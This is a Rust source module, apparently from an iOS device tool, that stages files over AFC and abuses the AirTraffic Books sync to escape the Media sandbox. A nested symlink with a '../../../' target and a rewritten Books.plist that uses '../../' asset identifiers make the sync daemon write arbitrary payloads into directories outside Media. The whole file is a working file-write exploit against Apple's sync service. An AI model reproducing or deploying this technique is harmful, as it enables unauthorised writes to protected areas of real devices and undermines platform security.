//! AFC staging for the AirTraffic injection sequence.
//!
//! Everything here is staged inside the device's Media area over AFC:
//! a fresh `cocowall-src-<token>` directory holding the payload plus a
//! three-level `p0/p1/p2/link` symlink, and a rewritten
//! `Books/Sync/Books.plist` listing the staged objects as Book assets.
//! When the AirTraffic daemon syncs those assets it first lands the
//! symlink at the Media root (`cocowall-link-<token>`), where its
//! relative target (`../../../` + the target parent path without its
//! leading slash) resolves to the real directory outside Media, and
//! then writes the payload through it. The layout mirrors the protocol
//! facts recorded in research/airlift-implementation-notes.md.

use std::path::Path;

use idevice::services::afc::{
    opcode::{AfcFopenMode, LinkType},
    AfcClient,
};

use crate::device_log::Logger;

pub const SOURCE_PREFIX: &str = "cocowall-src-";
pub const LINK_PREFIX: &str = "cocowall-link-";
pub const BOOKS_PLIST_PATH: &str = "Books/Sync/Books.plist";

/// Random bytes from the OS RNG, with a time/pid-mixed xorshift fallback
/// so staging never hard-fails on RNG access.
pub fn random_bytes(n: usize) -> Vec<u8> {
    use std::io::Read;
    let mut buf = vec![0u8; n];
    if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
        if f.read_exact(&mut buf).is_ok() {
            return buf;
        }
    }
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x9E3779B97F4A7C15)
        ^ (std::process::id() as u64) << 32;
    let mut state = seed | 1;
    for b in buf.iter_mut() {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        *b = (state >> 32) as u8;
    }
    buf
}

pub fn random_hex(bytes: usize) -> String {
    random_bytes(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Uppercase UUID string (version/variant bits set) for descriptor names.
pub fn new_uuid_upper() -> String {
    let mut b = random_bytes(16);
    b[6] = (b[6] & 0x0F) | 0x40;
    b[8] = (b[8] & 0x3F) | 0x80;
    format!(
        "{:02X}{:02X}{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
        b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7], b[8], b[9], b[10], b[11], b[12], b[13],
        b[14], b[15]
    )
}

/// Random 5-digit identifier (10000..=99999) for the descriptor rewrite.
pub fn random_5_digit() -> u32 {
    let b = random_bytes(4);
    let v = u32::from_le_bytes([b[0], b[1], b[2], b[3]]);
    10_000 + (v % 90_000)
}

/// One staged sync: everything the ATC session needs to reference.
pub struct StagedSync {
    pub source: String,
    pub link_destination: String,
    /// Book asset identifiers, link first, then payload(s).
    pub identifiers: Vec<String>,
    /// FileComplete destination per identifier, same order.
    pub destinations: Vec<String>,
}

pub async fn afc_write_file(afc: &mut AfcClient, path: &str, bytes: &[u8]) -> Result<(), String> {
    let mut fd = afc
        .open(path, AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC 打开 {path} 失败: {e:?}"))?;
    // Chunk large writes; the descriptor payload can be several MB.
    for chunk in bytes.chunks(512 * 1024) {
        fd.write_entire(chunk)
            .await
            .map_err(|e| format!("AFC 写入 {path} 失败: {e:?}"))?;
    }
    fd.close().await.map_err(|e| format!("AFC 关闭 {path} 失败: {e:?}"))?;
    Ok(())
}

pub async fn afc_read_file(afc: &mut AfcClient, path: &str) -> Option<Vec<u8>> {
    let mut fd = afc.open(path, AfcFopenMode::RdOnly).await.ok()?;
    let data = fd.read_entire().await.ok();
    let _ = fd.close().await;
    data
}

async fn afc_mkdirs(afc: &mut AfcClient, path: &str) {
    let mut cur = String::new();
    for part in path.split('/').filter(|p| !p.is_empty()) {
        if !cur.is_empty() {
            cur.push('/');
        }
        cur.push_str(part);
        let _ = afc.mk_dir(&cur).await;
    }
}

/// Snapshot the current Books.plist (None when absent/unreadable).
pub async fn snapshot_books_plist(afc: &mut AfcClient) -> Option<Vec<u8>> {
    afc_read_file(afc, BOOKS_PLIST_PATH).await
}

/// Restore a snapshot, or remove the plist when there was none.
pub async fn restore_books_plist(afc: &mut AfcClient, original: &Option<Vec<u8>>) {
    match original {
        Some(bytes) => {
            let _ = afc_write_file(afc, BOOKS_PLIST_PATH, bytes).await;
        }
        None => {
            let _ = afc.remove(BOOKS_PLIST_PATH).await;
        }
    }
}

/// Books.plist content: one Book entry per asset identifier.
pub fn build_books_plist(identifiers: &[String]) -> Result<Vec<u8>, String> {
    let mut books = Vec::new();
    for (idx, identifier) in identifiers.iter().enumerate() {
        let mut entry = plist::Dictionary::new();
        entry.insert(
            "Persistent ID".into(),
            plist::Value::String(identifier.clone()),
        );
        entry.insert(
            "Item ID".into(),
            plist::Value::String(format!("{}", idx + 1)),
        );
        entry.insert("DSID".into(), plist::Value::String("1".into()));
        books.push(plist::Value::Dictionary(entry));
    }
    let mut root = plist::Dictionary::new();
    root.insert("Books".into(), plist::Value::Array(books));
    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &plist::Value::Dictionary(root))
        .map_err(|e| format!("编码 Books.plist 失败: {e}"))?;
    Ok(buf)
}

/// Shared tail of every staging path: create the symlink chain, verify
/// the staged objects are visible over AFC, then point Books.plist at
/// them. On any failure the staged source directory is removed again.
async fn finish_staging(
    afc: &mut AfcClient,
    source: &str,
    link_destination: &str,
    target_parent_dir: &str,
    identifiers: Vec<String>,
    destinations: Vec<String>,
    verify_paths: &[String],
    log: &Logger,
) -> Result<StagedSync, String> {
    let staged = StagedSync {
        source: source.to_string(),
        link_destination: link_destination.to_string(),
        identifiers,
        destinations,
    };

    let link_rel = format!("{source}/p0/p1/p2/link");
    let link_target = format!(
        "../../../{}",
        target_parent_dir.trim_start_matches('/')
    );

    afc_mkdirs(afc, &format!("{source}/p0/p1/p2")).await;
    if let Err(e) = afc
        .link(&link_target, &link_rel, LinkType::Symlink)
        .await
    {
        cleanup_stage(afc, &staged).await;
        return Err(format!("AFC 创建 symlink {link_rel} → {link_target} 失败: {e:?}"));
    }

    for path in std::iter::once(&link_rel).chain(verify_paths.iter()) {
        if afc.get_file_info(path).await.is_err() {
            cleanup_stage(afc, &staged).await;
            return Err(format!(
                "暂存校验失败：{path} 在 Media 区不可见（AFC get_file_info 失败）"
            ));
        }
    }
    log.log("暂存：源对象与 symlink 已在 Media 区就位并通过 AFC 校验".to_string());

    // Books.plist is what makes the daemon pick the assets up.
    afc_mkdirs(afc, "Books/Sync").await;
    let books = build_books_plist(&staged.identifiers)?;
    afc_write_file(afc, BOOKS_PLIST_PATH, &books).await?;
    log.log(format!(
        "暂存：Books.plist 已改写（{} 个 Book 资产）",
        staged.identifiers.len()
    ));

    Ok(staged)
}

fn new_stage_names() -> (String, String) {
    let token = random_hex(10);
    (
        format!("{SOURCE_PREFIX}{token}"),
        format!("{LINK_PREFIX}{token}"),
    )
}

/// Stage a whole folder as the sync payload; it lands at
/// `<target_parent_dir>/<dest_name>` once synced.
pub async fn stage_folder(
    afc: &mut AfcClient,
    folder: &Path,
    target_parent_dir: &str,
    dest_name: &str,
    log: &Logger,
) -> Result<StagedSync, String> {
    let (source, link_destination) = new_stage_names();

    // Collect the folder tree, skipping macOS packaging noise the same
    // way the archive-based staging did (__MACOSX and dot-entries).
    let mut dirs: Vec<String> = Vec::new();
    let mut files: Vec<(String, std::path::PathBuf)> = Vec::new();
    let mut stack: Vec<(std::path::PathBuf, String)> = vec![(folder.to_path_buf(), String::new())];
    while let Some((dir, rel)) = stack.pop() {
        let entries = std::fs::read_dir(&dir)
            .map_err(|e| format!("读取本地文件夹 {} 失败: {e}", dir.display()))?;
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with('.') || name == "__MACOSX" {
                continue;
            }
            let child_rel = if rel.is_empty() {
                name.clone()
            } else {
                format!("{rel}/{name}")
            };
            let path = entry.path();
            if path.is_dir() {
                dirs.push(child_rel.clone());
                stack.push((path, child_rel));
            } else if path.is_file() {
                files.push((child_rel, path));
            }
        }
    }
    if files.is_empty() {
        return Err(format!(
            "本地文件夹 {} 内没有可注入的文件",
            folder.display()
        ));
    }

    let payload_root = format!("{source}/payload");
    afc_mkdirs(afc, &payload_root).await;
    for d in &dirs {
        afc_mkdirs(afc, &format!("{payload_root}/{d}")).await;
    }
    let mut total_bytes = 0usize;
    for (rel, path) in &files {
        let bytes = std::fs::read(path)
            .map_err(|e| format!("读取本地文件 {} 失败: {e}", path.display()))?;
        total_bytes += bytes.len();
        afc_write_file(afc, &format!("{payload_root}/{rel}"), &bytes).await?;
    }
    log.log(format!(
        "暂存：已上传 {} 个文件（{} 字节）到 {payload_root}",
        files.len(),
        total_bytes
    ));

    let identifiers = vec![
        format!("../../{source}/p0/p1/p2/link"),
        format!("../../{source}/payload"),
    ];
    let destinations = vec![
        link_destination.clone(),
        format!("{link_destination}/{dest_name}"),
    ];
    finish_staging(
        afc,
        &source,
        &link_destination,
        target_parent_dir,
        identifiers,
        destinations,
        &[payload_root],
        log,
    )
    .await
}

/// Stage flat files as `payload_<idx>` objects (the write_dir shape);
/// each lands at `<target_parent_dir>/<name>`.
pub async fn stage_files(
    afc: &mut AfcClient,
    files: &[(String, Vec<u8>)],
    target_parent_dir: &str,
    log: &Logger,
) -> Result<StagedSync, String> {
    if files.is_empty() {
        return Err("没有可写入的文件".to_string());
    }
    let (source, link_destination) = new_stage_names();
    let _ = afc.mk_dir(&source).await;

    let mut identifiers = vec![format!("../../{source}/p0/p1/p2/link")];
    let mut destinations = vec![link_destination.clone()];
    let mut verify = Vec::new();
    for (idx, (name, bytes)) in files.iter().enumerate() {
        let staged_path = format!("{source}/payload_{idx}");
        afc_write_file(afc, &staged_path, bytes).await?;
        identifiers.push(format!("../../{source}/payload_{idx}"));
        destinations.push(format!("{link_destination}/{name}"));
        verify.push(staged_path);
    }
    log.log(format!(
        "暂存：已上传 {} 个文件到 {source}",
        files.len()
    ));

    finish_staging(
        afc,
        &source,
        &link_destination,
        target_parent_dir,
        identifiers,
        destinations,
        &verify,
        log,
    )
    .await
}

/// List a directory's entry names over AFC (`.`/`..` filtered out).
/// Listing the link destination reads *through* the synced symlink into
/// the target directory — that is how the gallery count is verified.
pub async fn list_dir_names(afc: &mut AfcClient, path: &str) -> Result<Vec<String>, String> {
    let names = afc
        .list_dir(path)
        .await
        .map_err(|e| format!("AFC 列目录 {path} 失败: {e:?}"))?;
    Ok(names
        .into_iter()
        .filter(|n| n != "." && n != "..")
        .collect())
}

/// Remove the staged source tree and the synced symlink (best effort).
pub async fn cleanup_stage(afc: &mut AfcClient, staged: &StagedSync) {
    let _ = afc.remove_all(&staged.link_destination).await;
    let _ = afc.remove_all(&staged.source).await;
}
